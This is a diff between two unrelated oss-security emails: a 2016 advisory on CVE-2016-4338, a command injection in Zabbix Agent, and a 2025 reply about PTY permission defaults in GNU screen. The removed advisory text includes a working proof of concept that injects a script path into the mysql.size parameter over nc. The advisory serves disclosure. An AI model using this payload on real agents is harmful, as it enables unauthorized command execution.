@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3707" "Wednesday" "4" "May" "2016" "12:28:13" "+0300" "Timo Juhani Lindfors" "timo.lindfors@iki.fi" "<84vb2uf9zm.fsf@sauna.l.org>" "91" "[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection" "^Date:" nil nil "5" "2016050409:28:13" "[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection" (number mark "U       timo.lindfor May  4   91/3707  " thread-indent "\"[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 21885 invoked by uid 550); 4 May 2016 09:44:22 -0000
+Received: (qmail 32401 invoked by uid 550); 14 May 2025 11:45:17 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,108 +6,121 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 32413 invoked from network); 4 May 2016 09:28:25 -0000
-Message-ID: <84vb2uf9zm.fsf@sauna.l.org>
-User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/23.2 (gnu/linux)
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-X-SA-Exim-Connect-IP: 2001:2003:f813:ef00:222:15ff:fe58:71e8
-X-SA-Exim-Mail-From: timo.lindfors@iki.fi
-X-SA-Exim-Scanned: No (on mail.kapsi.fi); SAEximRunCond expanded to false
-Date: Wed, 04 May 2016 12:28:13 +0300
-From: Timo Juhani Lindfors <timo.lindfors@iki.fi>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
-To: oss-security@lists.openwall.com
+x-ms-reactions: disallow
+Received: (qmail 32377 invoked from network); 14 May 2025 11:45:17 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+	t=1747223107; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=zrIWPM7kBhkbSNjLJHWRLAOUpOAXSN24blthzTeZuOo=;
+	b=QjQaMpTA8w6IUNDSQ+l1+MsAoSmemAB1BXKX2WMERncZoLwddOC2SGl3vPhCVWu6syXsY3
+	2xnQipItjZzf9NQZa5xVOPAyNdXgKRFUUs1/laHqNtES2O1cOBUzITZbHbADsS8Ax1YUz7
+	8B5F9Z80zYVq8/NeNS3DKFBy/Z5DgNo=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+	s=susede2_ed25519; t=1747223107;
+	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=zrIWPM7kBhkbSNjLJHWRLAOUpOAXSN24blthzTeZuOo=;
+	b=OqzqQ6r6Yb+C7S6gx9BgxQ4+3xY/q1IH1whCyRYaXGbTG/a2x72A8UHWiM9FqsHQf8T2Dz
+	tQeyvg/QGrZlSNAg==
+Authentication-Results: smtp-out2.suse.de;
+	dkim=pass header.d=suse.de header.s=susede2_rsa header.b=we6k5OZW;
+	dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=azCxMxcb
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+	t=1747223106; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=zrIWPM7kBhkbSNjLJHWRLAOUpOAXSN24blthzTeZuOo=;
+	b=we6k5OZWj0vqYFjTt6FlFgDe2KBxu352WDw/MANAQF0hgNnaJIGw840x7fa9+SG34NM+wm
+	XFClad7673zrQbjKxc10rKyItvyWcHVxJjRLCAj3IoYMR7TTfsnsK7BPDUSyvluSM5IfH7
+	/amvJlYB/2hizyPZi/OXWoc0RMgmrRo=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+	s=susede2_ed25519; t=1747223106;
+	h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 in-reply-to:in-reply-to:references:references;
+	bh=zrIWPM7kBhkbSNjLJHWRLAOUpOAXSN24blthzTeZuOo=;
+	b=azCxMxcbFPHJyvvcPm362ohOIoyabri7JT5W8ZbDl2FKvjioJ8xMBZd54Cjbhcs6kmIXu+
+	7GcEp0ReG88nMiAA==
+Date: Wed, 14 May 2025 13:45:05 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
+To: "Dr. Thomas Orgis" <thomas.orgis@uni-hamburg.de>
+Cc: oss-security@lists.openwall.com
+Message-ID: <aCSCQU_BOMIHm28K@kasco.suse.de>
+References: <aCISrQTbLQjaxBZS@kasco.suse.de>
+ <20250513182106.414b569f@plasteblaster>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="HgUa4S7Xp5IQ827n"
+Content-Disposition: inline
+In-Reply-To: <20250513182106.414b569f@plasteblaster>
+Subject: Re: [oss-security] screen: Multiple Security Issues in Screen
+ (mostly affecting release 5.0.0 and setuid-root installations)
 
-CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
---------------------------------------------------------------------
+--HgUa4S7Xp5IQ827n
+Content-Type: text/plain; protected-headers=v1; charset=utf-8
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 14 May 2025 13:45:05 +0200
+From: Matthias Gerstner <mgerstner@suse.de>
+To: "Dr. Thomas Orgis" <thomas.orgis@uni-hamburg.de>
+Cc: oss-security@lists.openwall.com
+Subject: Re: [oss-security] screen: Multiple Security Issues in Screen
+ (mostly affecting release 5.0.0 and setuid-root installations)
 
-Affected products
-=================
+Hello Thomas,
 
-At least Zabbix Agent 1:3.0.1-1+wheezy from
-http://repo.zabbix.com/zabbix/3.0/debian is vulnerable. Other versions
-were not tested.
+On Tue, May 13, 2025 at 06:21:06PM +0200, Dr. Thomas Orgis wrote:
+> Are you sure the safe default wins? I also read configure.ac as such,
+> at a first glance =E2=80=A6 but running plain configure results in
+>=20
+> $ grep PTYMODE config.h
+>  * define PTYMODE if you do not like the default of 0622, which allows=20
+> /* #undef PTYMODE */
+>=20
+> on a Debian 12 machine with perhaps a specific setup because of
+> multiuser access =E2=80=94 exactly the situation where the world-writable=
+ ptys
+> are of most concern.  Configure messages:
+>=20
+> configure: checking for ptyranges...
+> configure: checking default tty permissions/group...
+> checking for write... /usr/bin/write
+> checking for xterm... no
+> - ptys are world accessable
 
-Background
-==========
+we did not dive this deeply into the configure script logic, we simply
+assumed it always applies the default without further checks. It seems
+to work out on openSUSE Tumblweed in the build service context at least.
 
-"Zabbix agent is deployed on a monitoring target to actively monitor
- local resources and applications (hard drives, memory, processor
- statistics etc).
+As we stated in the report, explicitly passing the mode, and likely also
+the group is the recommended way to avoid any uncertainties in this
+area.
 
- The agent gathers operational information locally and reports data to
- Zabbix server for further processing. In case of failures (such as a
- hard disk running full or a crashed service process), Zabbix server
- can actively alert the administrators of the particular machine that
- reported the failure.
+Cheers
 
- Zabbix agents are extremely efficient because of use of native system
- calls for gathering statistical information."
+Matthias
 
- -- https://www.zabbix.com/documentation/3.0/manual/concepts/agent
+--HgUa4S7Xp5IQ827n
+Content-Type: application/pgp-signature; name="signature.asc"
 
-Description
-===========
+-----BEGIN PGP SIGNATURE-----
 
-Zabbix agent listens on port 10050 for connections from the Zabbix
-server. The commands can be built-in or user-defined.
+iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAmgkgkEACgkQFMQFyXGS
+NVNUkA//ZcZlrNZ5LY1PH4zFbMUOiKmmQVHikUmchKkMdnCrDNG7RLVmAh0SLd19
+xEOViRHXBdmxOElGRw5yE5JxbWhnZr5ECTjYZ7qr5wqk7saMZgxQmDDwfT59r0Ic
++Z+iSeL7/XgiL3RtVyqPcn0/mrSpSYsEWcldpnFh6ccYy2KhF1pAgh3yBv7VRj7F
+dHrUdz32Qq2ATXFK/VkjosFOen5DF2iYQP6DWtPBWftPK8Ezf7FIYPS5mfy8YGCB
+6JFx/nG4+eCuZFsZtEJb5SSTL7qgf3Nd90xuoCRsBfvdLQj1Dm4I0VHxxeOmjrDE
+Dp4Cp3Aqt9qzM2Li7UcQYXsP/gc5VMUU6cAc5j7jn3mo/PZCdOthQ+stEyl/TnSE
+wpsMbmNUK5Uoz4mWSrl1GejDoEbZSYY+Ye5eibfnlZg1w9yoquLE3LcLQRec3Lp3
+UoHE7vgpJFy0UykhQ+7gLmmzNCulFdHB9faQs/hsiiYZ0hSmHZUYqKGgMIG4QDw/
+/47D3ZNZ94TMZeavuaCndBLEIFrVKHdZEbgMt5b+GCivGIOh/ThzfHnh4/o9v4Ji
+APhlB7r4XNUZ3AXVne7/hVAbXUMhUuD3TFjfjfXjWqJYLor1tJ41U0dkwduaAqmz
+bKLeykLdOHwoml7THfc6OLMlcUvzhM5KljGeaXHzDhNJoEzODgE=
+=DiIe
+-----END PGP SIGNATURE-----
 
-The mysql.size user parameter defined in
-/etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf takes three input
-parameters and uses a shell script to generate an SQL query:
-
-UserParameter=mysql.size[*],echo "select sum($(case "$3" in both|"") echo "data_length+index_length";; data|index) echo "$3_length";; free) echo "data_free";; esac)) from information_schema.tables$([[ "$1" = "all" || ! "$1" ]] || echo " where table_schema='$1'")$([[ "$2" = "all" || ! "$2" ]] || echo "and table_name='$2'");" | HOME=/var/lib/zabbix mysql -N
-
-The code assumes that /bin/sh is bash that supports the [[ compound
-command. However, if /bin/sh is for example dash the statement
-
-[[ "$1" = "all" || ! "$1" ]]
-
-ends up executing the command "$1" with the argument "]]".
-
-Exploit
-=======
-
-Zabbix sanitizes the input and blocks many dangerous characters
-("\\'\"`*?[]{}~$!&;()<>|#@\n"). Since we cannot use quotes we cannot
-give our shell commands any parameters which significantly reduces the
-impact of this vulnerability. If you find a way to execute arbitrary
-commands using this flaw I'd be really interested in the details. The
-following proof-of-concept shows how the vulnerability can be used
-escalate privileges locally:
-
-$ echo -en '#!/bin/bash\necho "This code is running as $(id)" 1>&2\n' > /tmp/owned
-$ chmod a+rx /tmp/owned
-$ echo 'mysql.size[/tmp/owned,all,both]' | nc localhost 10050 | cat -A
-ZBXD^AM-^O^@^@^@^@^@^@^@sh: 1: [[: not found$
-This code is running as uid=110(zabbix) gid=114(zabbix) groups=114(zabbix)$
-sh: 1: [[: not found$
-sh: 1: all: not found$
-
-The exploit of course assumes that the Server line in the
-configuration includes "127.0.0.1". If the agent is configured to
-accept connections only from the Zabbix server. In that case this
-issue can only be exploited from the server or by spoofing the IP
-address of the server (with for example ARP spoofing).
-
-Since output of the command is piped to mysql it might be possible to
-also execute some SQL commands in the database.
-
-Author
-======
-
-This issue was discovered by Timo Lindfors from Nixu Corporation.
-
-Timeline
-========
-
-2016-04-19: Issue discovered and reported internally for verification.
-2016-04-21: Issue reported to vendor.
-2016-04-22: Vendor acknowledges vulnerability and starts patching.
-2016-04-26: Asked status update from vendor.
-2016-04-26: Vendor responds that the issue is still being patched.
-2016-04-26: CVE requested from MITRE.
-2016-04-28: MITRE assigned CVE-2016-4338 for this vulnerability.
-2016-05-02: Vendor published details in the issue tracker https://support.zabbix.com/browse/ZBX-10741
+--HgUa4S7Xp5IQ827n--
